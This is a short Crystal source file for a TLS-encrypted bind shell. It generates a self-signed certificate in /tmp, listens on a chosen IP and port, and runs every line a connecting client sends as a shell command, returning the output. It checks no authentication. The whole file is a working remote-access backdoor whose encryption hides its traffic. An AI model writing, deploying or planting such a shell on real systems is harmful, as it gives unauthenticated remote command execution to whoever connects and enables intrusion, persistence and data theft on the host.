require "socket"
require "colorize"
require "openssl"

def usage(err)
  puts "error: #{err}".colorize(:red)
  puts "usage: #{File.basename __FILE__} [ip] [port]"
  exit 1
end

def handle(client)
  puts "[+] New Client"
  while cmd = client.gets
    puts "=> #{cmd}"
    client.puts `#{cmd}`
  end
  puts "[-] Client Gone"
  client.close
end

def serve(server)
  puts "[+] Listening on #{server.local_address}"
  loop do
    client = server.accept
    client.sync = true
    handle client
  rescue
    next
  end
end

ip = ARGV[0]? || usage "missing ip and port"
port = ARGV[1]? || usage "missing port"
port = port.to_i? || usage "bad port"

tcp_server = TCPServer.new(ip, port)
`openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/priv.key -out /tmp/cert.crt -subj "/CN=x" 2> /dev/null`
ctx = OpenSSL::SSL::Context::Server.from_hash({"key" => "/tmp/priv.key", "cert" => "/tmp/cert.crt"})
ssl_server = OpenSSL::SSL::Server.new(tcp_server, ctx)

serve ssl_server
